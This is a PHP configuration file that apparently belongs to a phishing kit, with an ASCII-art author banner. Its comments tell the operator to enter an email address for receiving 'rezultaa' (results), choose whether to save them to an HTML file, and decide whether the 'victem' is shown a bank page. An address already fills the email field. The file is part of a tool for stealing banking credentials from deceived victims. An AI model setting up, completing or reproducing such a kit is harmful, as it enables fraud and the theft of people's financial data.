﻿<?php 
/*
 █     █░ ▒█████   ██▀███   ██ ▄█▀    ██░ ██  ▄▄▄       ██▀███  ▓█████▄     ██▒   █▓
▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒    ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌   ▓██░   █▒
▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░    ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌    ▓██  █▒░
░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄    ░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌     ▒██ █░░
░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄   ░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓       ▒▀█░  
░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒    ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒       ░ ▐░  
  ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒       ░ ░░  
  ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░     ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░         ░░  
    ░        ░ ░     ░     ░  ░       ░  ░  ░      ░  ░   ░        ░             ░  
#By Zetas Oujdi, Work Hard Dream B!G,
#Thanks To Brothers V!rus YassCom, & X-Wjdy;													 
*/
$em   = "njahslim2@gmail.com"; // make your email here !! 
$rzhtm = "off"; // if do you want rezultaa text in html file, make "on" do you not want, make "off" 
$pgbnk = "yes"; // if you want to victem showed bank page, make "yes" or not, make "no"
?>                                                                               